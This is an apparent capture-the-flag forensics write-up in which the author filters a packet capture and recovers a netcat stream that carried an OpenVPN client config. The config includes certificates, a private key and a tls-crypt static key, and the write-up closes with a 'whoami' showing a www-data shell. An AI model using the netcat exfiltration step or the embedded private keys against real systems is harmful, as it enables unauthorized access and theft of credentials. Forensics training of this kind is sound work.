### Find VPN key in this packet capture:

[Packet Capture Download](https://drive.google.com/file/d/1LjIdKsVDKCT3sKPIztBbnslLLIrfZGL4/view)

What vpn protocol has a key exhcange

vpn IKE?

isakmp
din't work out so well

started looking at all the noise and noticed 107.172.29.202 was ping sweeping and creating too many packets to wade through.



Tried to filter out noise.
 applied this filter

       ip.dst != 107.172.29.202 && ip.src !=107.172.29.202 && ip.addr != 204.11.56.48 && !icmp

### NetCat Stream

nc -nv 10.8.0.2 8888
file: comp.ovpn

client
proto tcp
                    
remote 198.12.71.251 443  
dev tun
resolv-retry infinite
nobind
persist-key
persist-tun
remote-cert-tls server
verify-x509-name server_GYnO1H974rtzuMEp name
auth SHA256
auth-nocache
cipher AES-128-GCM
tls-client
tls-version-min 1.2
tls-cipher TLS-ECDHE-ECDSA-WITH-AES-128-GCM-SHA256
ignore-unknown-option block-outside-dns
setenv opt block-outside-dns # Prevent Windows 10 DNS leak
verb 3
<ca>
-----BEGIN CERTIFICATE-----
MIIB1zCCAX2gAwIBAgIUakrFUEvYZlgIXTjvEzxcfIMva3cwCgYIKoZIzj0EAwIw
HjEcMBoGA1UEAwwTY25fZXk2em9nWm9WcXRFMmMxQzAeFw0yMzAzMjAwNDU4MDRa
Fw0zMzAzMTcwNDU4MDRaMB4xHDAaBgNVBAMME2NuX2V5NnpvZ1pvVnF0RTJjMUMw
WTATBgcqhkjOPQIBBggqhkjOPQMBBwNCAAQU0lxDnn9OeHCbPpbclRjreeu5XFic
gZ4VdXhqZdS5ddT1rYA+O+1upFjxqWgpa9FF1eY9xNxy8uUTiwuSd0gRo4GYMIGV
MB0GA1UdDgQWBBRAiM5/p35bdCsEa0QtU//cN7GiRTBZBgNVHSMEUjBQgBRAiM5/
p35bdCsEa0QtU//cN7GiRaEipCAwHjEcMBoGA1UEAwwTY25fZXk2em9nWm9WcXRF
MmMxQ4IUakrFUEvYZlgIXTjvEzxcfIMva3cwDAYDVR0TBAUwAwEB/zALBgNVHQ8E
BAMCAQYwCgYIKoZIzj0EAwIDSAAwRQIhAOOn9Rjzb0XcqtH5WfDqth9KRyVIwxvo
zVtXzDU6twJWAiBHOF4EB5RWoeAGI6Jw/+hDfdu/iXQLRdEOgHTXpoOH2Q==
-----END CERTIFICATE-----
</ca>
<cert>
-----BEGIN CERTIFICATE-----
MIIB1jCCAXygAwIBAgIQCk74lRL1yQDajAmX9+eBxTAKBggqhkjOPQQDAjAeMRww
GgYDVQQDDBNjbl9leTZ6b2dab1ZxdEUyYzFDMB4XDTIzMDMyMDA0NTgxNFoXDTI1
MDYyMjA0NTgxNFowDzENMAsGA1UEAwwEY29tcDBZMBMGByqGSM49AgEGCCqGSM49
AwEHA0IABE4x+pkqugsDh9C1yeqh72OdeZFybhJfXJAl8SkAJ1HMPXH3am9eBiOv
bdMQofnvgUu9JkqTPBS+elyZHhhcgRyjgaowgacwCQYDVR0TBAIwADAdBgNVHQ4E
FgQUYMFkHaFY5NyZPTo++/PIvTLKlWQwWQYDVR0jBFIwUIAUQIjOf6d+W3QrBGtE
LVP/3DexokWhIqQgMB4xHDAaBgNVBAMME2NuX2V5NnpvZ1pvVnF0RTJjMUOCFGpK
xVBL2GZYCF047xM8XHyDL2t3MBMGA1UdJQQMMAoGCCsGAQUFBwMCMAsGA1UdDwQE
AwIHgDAKBggqhkjOPQQDAgNIADBFAiEA4WBbt/OqLyh5x77uZxo/JtZ0/3tmrciV
XaMmxRpSA0UCIE/rnSweh/8TGHtFLFtxnwJew2146N0+7+flgphTDBw8
-----END CERTIFICATE-----
</cert>
<key>
-----BEGIN PRIVATE KEY-----
MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgPrjkMvXCFte61hsj
V0cVtUUuSByFffxqqLV8rRgLWMmhRANCAAROMfqZKroLA4fQtcnqoe9jnXmRcm4S
X1yQJfEpACdRzD1x92pvXgYjr23TEKH574FLvSZKkzwUvnpcmR4YXIEc
-----END PRIVATE KEY-----
</key>
<tls-crypt>

 2048 bit OpenVPN static key

-----BEGIN OpenVPN Static key V1-----
e63d2f5a0049779fba6d2faacd0a4d4a
bca313bb2e084dbd4c87f4e7e3c1a355
c2d22a996256a73d339b57b64234eaa0
6e82ef6639e4c4dda8995cff5f8e916e
7d3af53d04148d8cee52a376a25a5feb
63d9ac088c2602df526510024350e96e
ee492a314f1cf8e4b524a95171a8c15b
ac896d5d61416b3266bac9d62d27105b
9e94655da4870996e7147a058fce8bbf
e07b2eeaef0691d7fc28df3e4f78f58d
d757d29cd8a156b15b2af678b6b9dff3
0f8d63e829a0c98de46ac915d754ee8c
3e47799f4850537184e4ba3a70b5110b
4f674dd2a7255c61a8aeedcd1015fbad
a030a0ce072f696c93e03f3dfeebddcc
db59dc7a33fe0d23889857cf4c121dc9
-----END OpenVPN Static key V1-----
</tls-crypt>


EOF

whoami
www-data